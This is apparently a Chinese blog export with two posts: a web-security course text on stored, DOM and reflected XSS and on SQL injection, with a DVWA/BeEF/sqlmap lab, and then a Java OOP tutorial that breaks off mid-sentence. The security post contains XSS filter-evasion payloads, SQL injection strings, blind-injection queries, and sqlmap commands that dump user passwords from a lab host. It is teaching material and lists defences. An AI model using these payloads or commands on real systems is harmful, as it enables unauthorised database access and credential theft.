如果有某个Web应用程序的功能是负责将用户提交的数据存储到数据库中，然后在需要时将这个用户提交的数据再从数据库中提取出返回到网页中，在这个过程中，如果用户提交的数据中包含一个XSS攻击语句，一旦Web应用程序准备将这个攻击语句作为用户数据返回到网页中，那么所有包含这个回显信息的网页将全部受到XSS漏洞的影响，也就是说只要一个用户访问了这些网页中的任何一个，他都会遭受到来自该Web应用程序的跨站攻击。Web应用程序过于相信用户的数据，将其作为一个合法信息保存在数据库中，这等于是将一个定时炸弹放进了程序的内部，只要时机一到，这颗定时炸弹就会爆炸。这种因为存储外部数据而引发的XSS漏洞称为Web应用程序的Stored XSS漏洞，即存储型XSS漏洞。 存储型XSS漏洞广泛出现在允许Web用户自定义显示信息及允许Web用户上传文件信息的Web应用程序中，大部分的Web应用程序都属于此类。有一些Web应用程序虽然也属于此类，但是由于该Web应用程序只接受单个管理员的用户数据，而管理员一般不会对自己的Web应用程序做什么破坏，所以这种Web应用程序也不会遭到存储型XSS漏洞的攻击。 DOM-Based XSS漏洞： DOM是Document Object Model（文档对象模型）的缩写。根据W3C DOM规范（http://www.w.org.DOM/）,DOM是一种与浏览器、平台、语言无关的接口，使得网页开发者可以利用它来访问页面其他的标准组件。简单解释，DOM解决了Netscape的JavaScript和Microsoft的JScrtipt之间的冲突，给予Web设计师和开发者一个标准的方法，让他们来访问他们站点中的数据、脚本和表现层对象。 ​ 由于DOM有如此好的功能，大量的Web应用程序开发者在自己的程序中加入对DOM的支持，令人遗憾的是,Web应用程序开发者这种滥用DOM的做法使得Web应用程序的安全也大大降低，DOM-Based XSS正是在这样的环境下出现的漏洞。DOM-Based XSS漏洞与Stored XSS漏洞不同，因为他甚至不需要将XSS攻击语句存入到数据库中，直接在浏览器的地址栏中就可以让Web应用程序发生跨站行为。对于大多数的Web应用程序来说，这种类型的XSS漏洞是最容易被发现和利用的。 反射型XSS：仅对当次的页面访问产生影响。使得用户访问一个被攻击者篡改后的链接(包含恶意脚本)，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击目的。 5、XSS的防御 5.1基于特征的防御 XSS漏洞利用了Web页面的编写不完善，所以每一个漏洞所利用和针对的弱点都不尽相同。这就给XSS漏洞防御带来了困难：不可能以单一特征来概括所有XSS攻击。 传统XSS防御多采用特征匹配方式，在所有提交的信息中都进行匹配检查。对于这种类型的XSS攻击，采用的模式匹配方法一般会需要对“javascript”这个关键字进行检索，一旦发现提交信息中包含“javascript”，就认定为XSS攻击。这种检测方法的缺陷显而易见：黑客可以通过插入字符或完全编码的方式躲避检测。 （1） 在javascript中加入多个tab键，得到 IMG SRC&#x3D;”jav ascript:alert(‘XSS‘)” 。 （2） 在javascript中加入#x09编码字符，得到 IMG SRC&#x3D;”javascript:alert(‘XSS‘)” 。 （3） 在javascript中加入字符，得到 IMG SRC&#x3D;”javascript:alert(‘XSS‘)” 。 （4） 在javascript中的每个字符间加入回车换行符，得到 IMG SRC&#x3D;”j\\r\\na\\r\\nv\\r\\n\\r\\na\\r\\ns\\r\\nc\\r\\nr\\r\\ni\\r\\np\\r\\nt\\r\\n:alert(‘XSS‘)”。 （5） 对”javascript:alert(‘XSS‘)”采用完全编码，得到 IMGSRC&#x3D;#x6A#x61#x76#x61#x73#x63#x72#x69#x70#x74#x3A#x61#x6C#x65#x72#x74#x28#x27#x58#x53#x53#x27#x29。 上述方法都可以很容易的躲避基于特征的检测。而除了会有大量的漏报外，基于特征的还存在大量的误报可能：在上面的例子中，对”http://www.target.com/javascript/kkk.asp?id=2345&quot;这样一个URL，由于包含了关键字“javascript”，也将会触发报警。 基于代码修改的防御 还有一种方法就是从Web应用开发的角度来避免： （1） 对所有用户提交内容进行可靠的输入验证，包括对URL、查询关键字、HTTP头、POST数据等，仅接受指定长度范围内、采用适当格式、采用所预期的字符的内容来提交，对其他的一律过滤。 （2） 实现Session标记（session tokens）、CAPTCHA系统或者HTTP引用头检查，以防被攻击 。 SQL注入攻击 1、什么是SQL注入攻击 所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。 2、为何会有SQL注入攻击 很多电子商务应用程序都使用数据库来存储信息。不论是产品信息，账目信息还是其它类型的数据，数据库都是Web应用环境中非常重要的环节。SQL命令就是前端Web和后端数据库之间的接口，使得数据可以传递到Web应用程序，也可以从其中发送出来。需要对这些数据进行控制，保证用户只能得到授权给他的信息。可是，很多Web站点都会利用用户输入的参数动态的生成SQL查询要求，攻击者通过在URL、表格域，或者其他的输入域中输入自己的SQL命令，以此改变查询属性，骗过应用程序，从而可以对数据库进行不受限的访问。 因为SQL查询经常用来进行验证、授权、订购、打印清单等，所以，允许攻击者任意提交SQL查询请求是非常危险的。通常，攻击者可以不经过授权，使用SQL输入从数据库中获取信息。 3． 何时使用SQL注入攻击 当Web应用向后端的数据库提交输入时，就可能遭到SQL注入攻击。可以将SQL命令人为的输入到URL、表格域，或者其他一些动态生成的SQL查询语句的输入参数中，完成上述攻击。因为大多数的Web应用程序都依赖于数据库的海量存储和相互间的逻辑关系（用户权限许可，设置等），所以，每次的查询中都会存在大量的参数。 4、MySQL简介 SQL是结构化查询语言的简称，它是全球通用的标准数据库查询语言，主要用于关系型数据的操作和管理，如增加记录，删除记录，更改记录，查询记录等，常用命令知识如表所示。 命令短语 功能 例句 select 用于查询记录和赋值 select i,j,k from A (i,j,k是表A中仅有的列名) select i&#x3D;’1’ (将i赋值为字符1) select* from A (含义同第一个例句) update 用于修改记录 update A set i&#x3D;2 where i&#x3D;1 (修改A表中i&#x3D;1的i值为2) insert 用于添加记录 insert into A values(1, ‘2’,3) (向A表中插入一条记录(i,j,k)对应为(1, ‘2’,3)) delete 用于删除记录 delete A where i&#x3D;2 (删除A标中i&#x3D;2的所有表项) from 用于指定操作的对象名（表，视图，数据库等的名称） 见 select where 用于指定查询条件 select *from A,B where A.name&#x3D;B.name and A.id&#x3D;B.id and 逻辑与 1&#x3D;1 and 2&lt;&#x3D;2 or 逻辑或 1&#x3D;1 or 1&gt;2 not 逻辑非 not 1&gt;1 &#x3D; 相等关系或赋值 见and、or、not &gt;,&gt;&#x3D;,&lt;,&lt;&#x3D; 关系运算符 与相等关系(‘&#x3D;’)的用法一致。 单引号(“’”) 用于指示字符串型数据 见select 逗号 分割相同的项 见select * 通配符所有 见select – 行注释 –这里的语句将不被执行! &#x2F;* *&#x2F; 块注释 &#x2F;* 这里的语句将不被执行! *&#x2F; 5、实施SQL注入攻击 5.1． 攻击一 任何输入，不论是Web页面中的表格域还是一条SQL查询语句中API的参数，都有可能遭受SQL注入的攻击。如果没有采取适当的防范措施，那么攻击只有可能在对数据库的设计和查询操作的结构了解不够充分时才有可能失败。 从SQL命令（更多的SQL命令见原理三）SELECT切入比较好。SELECT的使用格式如下： SELECT datacolumn,otherdatacolumn FROM databasetable WHERE conditionismet SQL在Web应用程序中的常见用途就是查询产品信息。应用程序通过CGI参数建立链接，在随后的查询中被引用。这些链接看起来通常像如下的样子： http://www.flowershop.com/store/itemdetail.asp?id=896 应用程序需要知道用户希望得到哪种产品的信息，所以浏览器会发送一个标识符，通常称为id。随后，应用程序动态的将其包含到SQL查询请求中，以便于从数据库中找到正确的行。查询语句通常的形式如下： SELECT name,picture,description,price FROM products WHERE id&#x3D;896 但是，用户可以在浏览器中轻易的修改信息。设想一下，作为某个Web站点的合法用户，在登入这个站点的时候输入了账号ID和密码。下面的SQL查询语句将返回合法用户的信息： SELECT accountdata FROM accountinfo WHERE accountid &#x3D; ‘account’ AND password &#x3D; ‘passwd’ 上面的SQL查询语句中唯一受用户控制的部分就是在单引号中的字符串。这些字符串就是用户在Web表格中输入的。Web应用程序自动生成了查询语句中的剩余部分。 常理来讲，其他用户在查看此账号信息时，他需要同时知道此账号ID和密码，但通过SQL输入的攻击者可以绕过全部的检查。 比如，当攻击者知道系统中存在一个叫做Tom的用户时，他会在SQL请求中使用注释符（双虚线–），然后将下面的内容输入到用户账号的表格域中。 Tom’– 这将会动态地生成如下的SQL查询语句： SELECT accountdata FROM accountinfo WHERE accountid&#x3D;’Tom’–’ AND password&#x3D;’passwd’ 由于“–”符号表示注释，随后的内容都被忽略，那么实际的语句就是： SELECT accountdata FROM accountinfo WHERE accountid &#x3D; ‘Tom’ 没有输入Tom的密码，却从数据库中查到了Tom用户的全部信息！注意这里所使用的语法，作为用户，可以在用户名之后使用单引号。这个单引号也是SQL查询请求的一部分，这就意味着，可以改变提交到数据库的查询语句结构。 在上面的案例中，查询操作本来应该在确保用户名和密码都正确的情况下才能进行的，而输入的注释符将一个查询条件移除了，这严重的危及到了查询操作的安全性。允许用户通过这种方式修改Web应用中的代码，是非常危险的。 5.2 攻击二 一般的应用程序对数据库进行的操作都是通过SQL语句进行，如查询一个表(A)中的一个num&#x3D;8的用户的所有信息，我们通过下面的语句来进行: select* from A where num&#x3D;8 对应页面地址可能有http://127.0.0.1/list.jsp?num=8。 一个复合条件的查询: select* from A where id&#x3D;8 and name&#x3D;’k’ 对应页面地址可能有http://127.0.0.1/aaa.jsp?id=8&amp;name=k。 通常数据库应用程序中where子句后面的条件部分都是在程序中按需要动态创建的，如下面使用的方法: String N&#x3D;request.getParameter(“id”); &#x2F;&#x2F;获得请求参数id的字符串值 String K&#x3D;request.getParameter(“name”);&#x2F;&#x2F;获得请求参数name的字符串值 String str&#x3D;”select* from A where id&#x3D;”+N+” and name&#x3D;&#39;“+K+”&#39;“;&#x2F;&#x2F;执行数据库操作 当N,K从前台获得的数据中存在像“’”,“and 1&#x3D;1”,“or 1&#x3D;1”,“–”就会出现具有特殊意义的SQL语句，当上面http://127.0.0.1/aaa.jsp?id=8&amp;name=k中的“id=8 –”时，在页面地址中可能会有如下的表示： http：&#x2F;&#x2F;127.0.0.1&#x2F;list.jsp?n&#x3D;8 – 上面的str变成了： select* from A where id&#x3D;8 – and name&#x3D;’k’ 熟悉SQL Server 的人一定明白上面语句的意义，很明显，–后面的条件and name&#x3D;’k’不会被执行，因为它被“–”注释掉了。 当上面的K&#x3D;”XXX&#39;or 1&#x3D;1”时（“&#39;”是“’”在字符串中的转义字符），在页面地址中会有如下的表示： http：&#x2F;&#x2F;127.0.0.1&#x2F;list.jsp?name&#x3D;XXX’or 1&#x3D;1 同样上面的语句变成了： select *from A where id&#x3D;8 and name&#x3D;’XXX’ or 1&#x3D;1. 这条语句会导致查询到所有用户的信息而不需要使用正确的id和name属性，虽然结果不会在页面上直接得到，但可以通过数据库的一些辅助函数间接猜解得到，下面猜解的例子能够说明SQL注入漏洞的危害性： 在SQL Server 2000中有user变量，用于存储当前登录的用户名，因此可以利用猜解它来获得当前数据库用户名，从而确定当前数据库的操作权限是否为最高用户权限，在一个可以注入的页面请求地址后面加上下面的语句，通过修改数值范围，截取字符的位置，并重复尝试，就可以猜解出当前数据库连接的用户名： and (SubString(user,1,1)&gt; 65 and SubString(user,1,1)&lt;90) 如果正常返回，则说明当前数据库操作用户帐户名的前一个字符在A~Z的范围内，逐步缩小猜解范围，就可以确定猜解内容。SubString（）是SQL Server 2000 数据库中提供的系统函数，用于获取字符字符串的子串。65，和90分别是字母A和Z的ascii码。 再有，在数据库中查找用户表（需要一定的数据库操作权限），可以使用下面的复合语句： and (select count(*) from sysobjects where xtype&#x3D;’u’)&gt;n n取1，2，……,通过上面形式的语句可以判断数据库中有多少用户表。 可以通过and(substring((select top 1 name from sysobjects where xtype &#x3D;’u’),1,1)&#x3D;字符)的形式逐步猜解出表名。 利用构建的SQL注入短语，可以查询出数据库中的大部分信息，只要构建的短语能够欺骗被注入程序按你的意图执行，并能够正确分析程序返回的现象，注入攻击者就可以控制整个系统。 基于网页地址的SQL注入只是利用了页面地址携带参数这一性质，来构建特殊sql语句以实现对Web应用程序的恶意操作（查询，修改，添加等）。事实上SQL注入不一定要只针对浏览器地址栏中的url。任何一个数据库应用程序对前台传入数据的处理不当都会产生SQL注入漏洞，如一个网页表单的输入项，应用程序中文本框输的入信息等。 6、防范SQL注入方法汇总 Web开发人员认为SQL查询请求是可以信赖的操作，但事实却是恰恰相反的，他们没有考虑到用户可以控制这些查询请求的参数，并且可以在其中输入符合语法的SQL命令。 解决SQL注入问题的方法再次归于对特殊字符的过滤，包括URL、表格域以及用户可以控制的任何输入数据。与SQL语法相关的特殊字符以及保留字应当在查询请求提交到数据库之前进行过滤或者被去除（例如跟在反斜号后面的单引号）。过滤操作最好在服务器端进行。将过滤操作的代码插入到客户机端执行的HTML中，实在是不明智的，因为攻击者可以修改验证程序。防止破坏的唯一途径就是在服务器端执行过滤操作。避免这种攻击更加可靠的方式就是使用存储过程。具体可以通过以下若干方法来防范SQL注入攻击。 （1） 对前台传入参数按的数据类型，进行严格匹配（如查看描述数据类型的变量字符串中，是否存在字母）。 （2） 对于单一变量（如上面的K，N）如果有必要，过滤或替换掉输入数据中的空格。 （3） 将一个单引号（“’”），替换成两个连续的单引号（“’’”）。 （4） 限制输入数据的有效字符种类，排除对数据库操作有特殊意义的字符（如“–”）。 （5） 限制表单或查询字符串输入的长度。 （6） 用存储过程来执行所有的查询。 （7） 检查提取数据的查询所返回的记录数量。如果程序只要求返回一个记录，但实际返回的记录却超过一行，那就当作出错处理。 （8） 将用户登录名称、密码等数据加密保存。加密用户输入的数据，然后再将它与数据库中保存的数据比较，这相当于对用户输入的数据进行了“消毒”处理，用户输入的数据不再对数据库有任何特殊的意义，从而也就防止了攻击者注入SQL命令。 总而言之，就是要尽可能地限制用户可以存取的数据总数。另外，对用户要按“最小特权”安全原则分配权限，即使发生了SQL注入攻击，结果也被限制在那些可以被正常访问到的数据中。 实验步骤XSS部分：利用Beef劫持被攻击者客户端浏览器。 实验环境搭建。 角色：留言簿网站。存在XSS漏洞；（IIS或Apache、guestbook搭建） 攻击者：Kali（使用beEF生成恶意代码，并通过留言方式提交到留言簿网站）； 被攻击者：访问留言簿网站，浏览器被劫持。 1、利用AWVS扫描留言簿网站（安装见参考文档0.AWVS安装与使用.docx），发现其存在XSS漏洞，截图。 2、 Kali使用beef生成恶意代码，截图。 3、访问http:&#x2F;&#x2F;留言簿网站&#x2F;message.asp;将以下恶意代码写入网站留言板， ，截图。 4、管理员登录login.htm，账号密码均为admin，审核用户留言。只要客户端访问这个服务器的留言板，客户端浏览器就会被劫持，指定被劫持网站为学校主页，将你在beff中的配置截图。 5、回答问题：实验中XSS攻击属于哪种类型？回答：存储型 SQL注入部分：DVWA+SQLmap+Mysql注入实战** 实验环境搭建。启动Metasploitable2虚拟机。 1、注入点发现。首先肯定是要判断是否有注入漏洞。 在输入框输入1，返回 ID: 1 First name: admin Surname: admin 返回正常； 再次输入1’，报错，返回 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ‘’1’’’ at line 1 此时可以断定有SQL注入漏洞， http://IP地址/DVWA-master/vulnerabilities/sqli/?id=22&amp;Submit=Submit# 下面利用SQLMap进行注入攻击。将DVWA安全级别设置为最低； 2、枚举当前使用的数据库名称和用户名。你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id --current-db --current-user Sqlmap输出截图。 3、枚举数据库用户名和密码你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id --users --password ​ Sqlmap输出截图。 4、枚举数据库–dbs：枚举当前数据库 你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id --dbs Sqlmap输出截图。 5、枚举数据库和指定数据库的数据表 -D 数据库名：指定数据库 –tables：枚举指定数据库的所有表 你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id -D dvwa --tables ​ Sqlmap输出截图。 6、获取指定数据库和表中所有列的信息-D：指定的数据库 -T：指定数据库中的数据表 –columns：获取列的信息 你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id -D dvwa -T users --columns ​ Sqlmap输出截图。 7、枚举指定数据表中的所有用户名与密码,并down到本地。-C：枚举数据表中的列 –dump：存储数据表项 你输入的命令： 1sqlmap -u &#x27;http://192.168.154.142/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&#x27; --cookie=&quot;security=low; PHPSESSID=4f0c98e2c7d0f376e76c7be5f0ec97a2&quot; -p id -D dvwa -T users -C user,password --dump ​ Sqlmap输出截图。 查看down到本地的用户名与密码，截图。（提示带.的文件夹为隐藏，在图形命令下，用文件浏览器打开文件夹，按下ctrl+h组合键可显示隐藏文件合文件夹，再按一次取消显示。）","categories":[{"name":"安全","slug":"安全","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/"},{"name":"网络渗透测试","slug":"安全/网络渗透测试","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"实验","slug":"安全/网络渗透测试/实验","permalink":"http://example.com/categories/%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AE%9E%E9%AA%8C/"}],"tags":[{"name":"实验","slug":"实验","permalink":"http://example.com/tags/%E5%AE%9E%E9%AA%8C/"}]},{"title":"Java面向对象编程","slug":"Java面向对象编程","date":"2023-12-23T05:51:56.465Z","updated":"2023-12-28T04:43:48.054Z","comments":true,"path":"2023/12/23/Java面向对象编程/","permalink":"http://example.com/2023/12/23/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/","excerpt":"","text":"Java面向对象编程类与对象1234567891011121314151617181920212223242526272829303132333435363738394041//Java类及类的成员：属性、方法、构造器、代码块、内部类//面向对象的特征：封装、继承、多态、抽象//其他关键字的使用：this、super、package、import、static、final、interface、abstract等public class phone &#123; //属性 double price; String name; //方法 public void call()&#123; System.out.println(&quot;打电话&quot;); &#125; public void sendMessage(String[] message)&#123; System.out.println(message[1]); &#125; public void playGame(String game)&#123; System.out.println(&quot;玩&quot;+game); &#125;&#125;public class Main &#123; public static void main(String[] args) &#123; //创建对象 phone p1=new phone(); //声明属性 p1.name=&quot;redmi&quot;; p1.price=1999; //声明方法 p1.call(); p1.playGame(&quot;4&quot;); String[] message=&#123;&quot;1&quot;,&quot;2&quot;&#125;; p1.sendMessage(message); &#125;&#125;/*输出：打电话玩42*/ 对象数组1234567891011121314151617181920public class Main &#123; public static void main(String[] args) &#123; //创建对象数组 phone p1[]=new phone[2]; for (int a=0;a&lt;p1.length;a++) &#123; p1[a]=new phone(); &#125; //声明属性 p1[0].name=&quot;redmi&quot;; p1[0].price=1999; p1[1].name=&quot;onplus&quot;; p1[1].price=2499; for(int a=0;a&lt; p1.length;a++) &#123; System.out.println(&quot;品牌：&quot;+p1[a].name+&quot;,价格：&quot;+p1[a].price); &#125; &#125;&#125; 方法的重载1234567891011//在同一个类中，允许存在一个以上的同名方法，只要它们的参数列表不同即可public void playGame(String game)&#123; System.out.println(&quot;玩&quot;+game); &#125; public void playGame(String games,int a) &#123; System.out.println(&quot;玩了&quot;+games+a+&quot;小时&quot;); &#125; 可变个数形参的方法123456789public void sum(int...num)&#123; int sum=0; for(int a=0;a&lt;num.length;a++) &#123; sum=sum+num[a]; &#125; System.out.println(sum);&#125; 递归123public void methoda()&#123; methoda(); &#125; 封装12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/*一种将抽象性函式接口的实现细节部分包装、隐藏起来的方法。封装可以被认为是一个保护屏障，防止该类的代码和数据被外部类定义的代码随机访问 使用private protected public*/public class EncapTest&#123; private String name; private String idNum; private int age; public int getAge()&#123; return age; &#125; public String getName()&#123; return name; &#125; public String getIdNum()&#123; return idNum; &#125; public void setAge( int newAge)&#123; age = newAge; &#125; public void setName(String newName)&#123; name = newName; &#125; public void setIdNum( String newId)&#123; idNum = newId; &#125;&#125;public class RunEncap&#123; public static void main(String args[])&#123; EncapTest encap = new EncapTest(); encap.setName(&quot;James&quot;); encap.setAge(20); encap.setIdNum(&quot;12343ms&quot;); System.out.print(&quot;Name : &quot; + encap.getName()+ &quot; Age : &quot;+ encap.getAge()); &#125;&#125; modifier 本类内 本包内 其他包的子类 其他包的非子类 public y y y y protected y y y n no modifiter y y n n private y n n n 关键字this123456789101112131415161718//class Person &#123; private int age = 10;//a--&gt;private int a public Person()&#123; System.out.println(&quot;初始化年龄：&quot;+age);&#125; public int GetAge(int age)&#123; this.age = age;//this.age--&gt;a return this.age; &#125;&#125; public class test1 &#123; public static void main(String[] args) &#123; Person Harry = new Person(); System.out.println(&quot;Harry&#x27;s age is &quot;+Harry.GetAge(12)); &#125;&#125; 关键字 super123456789101112131415161718192021class Country &#123; String name; void value() &#123; name = &quot;China&quot;; &#125;&#125; class City extends Country &#123; String name; void value() &#123; name = &quot;Shanghai&quot;; super.value(); //调用父类的方法 System.out.println(name); System.out.println(super.name); &#125; public static void main(String[] args) &#123; City c=new City(); c.value(); &#125;&#125; 继承1234567891011121314151617181920212223242526272829//extends//在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。public class Animal &#123; private String name; private int id; public Animal(String myName, int myid) &#123; //初始化属性值 &#125; public void eat() &#123; //吃东西方法的具体实现 &#125; public void sleep() &#123; //睡觉方法的具体实现 &#125; &#125; public class Penguin extends Animal&#123; &#125; //implements/*使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。*/public interface A &#123; public void eat(); public void sleep();&#125; public interface B &#123; public void show();&#125; public class C implements A,B &#123;&#125; final 关键字12//使用 final 关键字声明类，就是把类定义定义为最终类，不能被继承，或者用于修饰方法，该方法不能被子类重写final class 类名 &#123;//类体&#125; 方法的重写1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465/*重写是子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变*/class Animal&#123; public void move()&#123; System.out.println(&quot;动物可以移动&quot;); &#125;&#125; class Dog extends Animal&#123; public void move()&#123; System.out.println(&quot;狗可以跑和走&quot;); &#125;&#125; public class TestDog&#123; public static void main(String args[])&#123; Animal a = new Animal(); // Animal 对象 Animal b = new Dog(); // Dog 对象 a.move();// 执行 Animal 类的方法 b.move();//执行 Dog 类的方法 &#125;&#125;/*编译结果：动物可以移动狗可以跑和走*/class Animal&#123; public void move()&#123; System.out.println(&quot;动物可以移动&quot;); &#125;&#125; class Dog extends Animal&#123; public void move()&#123; System.out.println(&quot;狗可以跑和走&quot;); &#125; public void bark()&#123; System.out.println(&quot;狗可以吠叫&quot;); &#125;&#125; public class TestDog&#123; public static void main(String args[])&#123; Animal a = new Animal(); // Animal 对象 Animal b = new Dog(); // Dog 对象 a.move();// 执行 Animal 类的方法 b.move();//执行 Dog 类的方法 b.bark(); &#125;&#125;/*编译结果：TestDog.java:30: cannot find symbolsymbol : method bark()location: class Animal b.bark(); ^该程序将抛出一个编译错误，因为b的引用类型Animal没有bark方法。*/ 多态12345678910111213141516171819202122//适用于方法，不适用与属性 向上转型abstract class Animal &#123; abstract void eat(); &#125; class Cat extends Animal &#123; public void eat() &#123; System.out.println(&quot;吃鱼&quot;); &#125; public void work() &#123; System.out.println(&quot;抓老鼠&quot;); &#125; &#125;public class Main &#123; public static void main(String[] args) &#123; Animal a=new Cat() &#125; //向下转型 Cat c = (Cat)a //instanceof if (a instanceof Cat) //判断a是否是猫 Object类1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677//Java.lang.Object//任何Java类（除Object类）都直接或间接的继承与Object类//Object类称为Java类的根父类//Object clone() 方法用于创建并返回一个对象的拷贝。/*clone 方法是浅拷贝，对象内属性引用的对象只会拷贝引用地址，而不会将引用的对象重新分配内存，相对应的深拷贝则会连引用的对象也新重新创建*/class RunoobTest implements Cloneable &#123; // 声明变量 String name; int likes; public static void main(String[] args) &#123; // 创建对象 RunoobTest obj1 = new RunoobTest(); // 初始化变量 obj1.name = &quot;Runoob&quot;; obj1.likes = 111; // 打印输出 System.out.println(obj1.name); // Runoob System.out.println(obj1.likes); // 111 try &#123; // 创建 obj1 的拷贝 RunoobTest obj2 = (RunoobTest) obj1.clone(); // 使用 obj2 输出变量 System.out.println(obj2.name); // Runoob System.out.println(obj2.likes); // 111 &#125; catch (Exception e) &#123; System.out.println(e); &#125; &#125;&#125;/*以上程序执行结果为：Runoob111Runoob111*///Object finalize() 方法用于实例被垃圾回收器回收的时触发的操作。//当 GC (垃圾回收器) 确定不存在对该对象的有更多引用时，对象的垃圾回收器就会调用这个方法。//语法 protected void finalize()class RunoobTest extends GregorianCalendar &#123; public static void main(String[] args) &#123; try &#123; // 创建 RunoobTest 对象 RunoobTest cal = new RunoobTest(); // 输出当前时间 System.out.println(&quot;&quot; + cal.getTime()); // finalize cal System.out.println(&quot;Finalizing...&quot;); cal.finalize(); System.out.println(&quot;Finalized.&quot;); &#125; catch (Throwable ex) &#123; ex.printStackTrace(); &#125; &#125;&#125;/*以上程序执行结果为：Sun Oct 11 11:36:46 CST 2020Finalizing...Finalized.*/ equals()12345678910111213141516171819202122//equals() 方法用于将字符串与指定的对象比较。//String 类中重写了 equals() 方法用于比较两个字符串的内容是否相等。/*使用 == 和 equals() 比较字符串。String 中 == 比较引用地址是否相同，equals() 比较字符串的内容是否相同：*/String s1 = &quot;Hello&quot;; // String 直接创建String s2 = &quot;Hello&quot;; // String 直接创建String s3 = s1; // 相同引用String s4 = new String(&quot;Hello&quot;); // String 对象创建String s5 = new String(&quot;Hello&quot;); // String 对象创建 s1 == s1; // true, 相同引用s1 == s2; // true, s1 和 s2 都在公共池中，引用相同s1 == s3; // true, s3 与 s1 引用相同s1 == s4; // false, 不同引用地址s4 == s5; // false, 堆中不同引用地址 s1.equals(s3); // true, 相同内容s1.equals(s4); // true, 相同内容s4.equals(s5); // true, 相同内容 toString()1234567891011121314151617181920212223/*toString() 方法用于返回以一个字符串表示的 Number 对象值。如果方法使用了原生的数据类型作为参数，返回原生数据类型的 String 对象值。如果方法有两个参数， 返回用第二个参数指定基数表示的第一个参数的字符串表示形式。语法 String toString() static String toString(int i) i -- 要转换的整数。 toString(): 返回表示 Integer 值的 String 对象。 toString(int i): 返回表示指定 int 的 String 对象。*/public class Test&#123; public static void main(String args[])&#123; Integer x = 5; System.out.println(x.toString()); System.out.println(Integer.toString(12)); &#125;&#125;/*编译以上程序，输出结果为：512*/ static静态12345678910111213//static修饰变量//类中公用static boolean nfc;p1.nfc =true;System.out.println(p1.nfc);//tureSystem.out.println(p2.nfc);//truep2.nfc=false;System.out.println(p1.nfc);//falseSystem.out.println(p1.nfc);//false//static修饰方法//static方法内可以调用static属性和static方法，不可以调用非static//非static可以调用static abstract抽象1234567891011/*1. 抽象类不能被实例化(初学者很容易犯的错)，如果被实例化，就会报错，编译无法通过。只有抽象类的非抽象子类可以创建对象。2. 抽象类中不一定包含抽象方法，但是有抽象方法的类必定是抽象类。3. 抽象类中的抽象方法只是声明，不包含方法体，就是不给出方法的具体实现也就是方法的具体功能。4. 构造方法，类方法（用 static 修饰的方法）不能声明为抽象方法。5. 抽象类的子类必须给出抽象类中的抽象方法的具体实现，除非该子类也是抽象类。*/ 接口123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//属性 必须使用public static final 修饰 不写默认加上//Java 原则上只支持单一继承，但通过接口可以实现多重继承的目的。//ClassC 同时继承了 ClassA 和 ClassB，ClassC 的对象在调用 ClassA 和 ClassB 中重写的方法时，就不知道该调用 ClassA 的方法，还是 ClassB 的方法。//接口没有这方面的困扰。来定义两个接口，Fly 接口会飞，Run 接口会跑。public interface Fly &#123; void fly();&#125;public interface Run &#123; void run();&#125;public class Pig implements Fly,Run&#123; @Override public void fly() &#123; System.out.println(&quot;会飞的猪&quot;); &#125; @Override public void run() &#123; System.out.println(&quot;会跑的猪&quot;); &#125;&#125;//实现多态。public interface Shape &#123; String name();&#125;public class Circle implements Shape &#123; @Override public String name() &#123; return &quot;圆&quot;; &#125;&#125;public class Square implements Shape &#123; @Override public String name() &#123; return &quot;正方形&quot;; &#125;&#125;List&lt;Shape&gt; shapes = new ArrayList&lt;&gt;();Shape circleShape = new Circle();Shape squareShape = new Square();shapes.add(circleShape);shapes.add(squareShape);for (Shape shape : shapes) &#123; System.out.println(shape.name());&#125;//圆//正方形 内部类123456class OuterClass &#123; // 外部类 // ... class NestedClass &#123; // 嵌套类，或称为内部类 // ... &#125;&#125; 枚举类 123public enum Color &#123; RED, GREEN, BLUE;&#125; 注解1234567891011121314@Override - 检查该方法是否是重写方法。如果发现其父类，或者是引用的接口中并没有该方法时，会报编译错误。@Deprecated - 标记过时方法。如果使用该方法，会报编译警告。@SuppressWarnings - 指示编译器去忽略注解中声明的警告。作用在其他注解的注解(或者说 元注解)是:@Retention - 